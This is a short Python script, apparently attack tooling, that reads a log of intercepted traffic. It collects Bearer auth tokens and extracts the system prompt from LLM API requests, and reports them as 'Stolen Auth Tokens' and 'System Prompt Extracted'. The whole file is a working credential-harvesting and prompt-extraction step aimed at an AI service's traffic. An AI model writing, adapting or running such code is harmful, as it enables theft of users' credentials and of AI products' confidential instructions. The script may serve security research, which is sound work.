
import json
import re

log_file = "intercepted_traffic.log"

def analyze_loot():
    print("----------------------------------------------------------------")
    print("                 ANTIGRAVITY EXPLOITATION REPORT                ")
    print("----------------------------------------------------------------")
    
    unique_tokens = set()
    system_prompt = None
    
    try:
        with open(log_file, "r", encoding="utf-8") as f:
            for line in f:
                if not line.strip(): continue
                try:
                    entry = json.loads(line)
                    
                    # 1. Hunt for Auth Tokens
                    headers = entry.get("request_headers", {})
                    auth = headers.get("Authorization")
                    if auth and "Bearer" in auth:
                        unique_tokens.add(auth)
                        
                    # 2. Hunt for System Prompt
                    # Look in request body for "messages" -> "role": "system"
                    body = entry.get("request_body", "")
                    if body and "role" in body and "system" in body:
                        try:
                            # It might be double-encoded JSON string inside a string
                            body_json = json.loads(body)
                            if "messages" in body_json:
                                for msg in body_json["messages"]:
                                    if msg.get("role") == "system":
                                        system_prompt = msg.get("content")
                        except:
                            pass
                            
                except json.JSONDecodeError:
                    pass

        print(f"\n[*] [ASSET THEFT] Stolen Auth Tokens: {len(unique_tokens)}")
        for i, token in enumerate(unique_tokens):
            print(f"    {i+1}. {token[:20]}...[REDACTED]")

        print(f"\n[*] [INTEL GATHERING] System Prompt Extracted:")
        if system_prompt:
            print(f"\n{system_prompt}\n")
        else:
            print("    [-] Not found in current logs.")

    except Exception as e:
        print(f"[-] Analysis failed: {e}")

if __name__ == "__main__":
    analyze_loot()
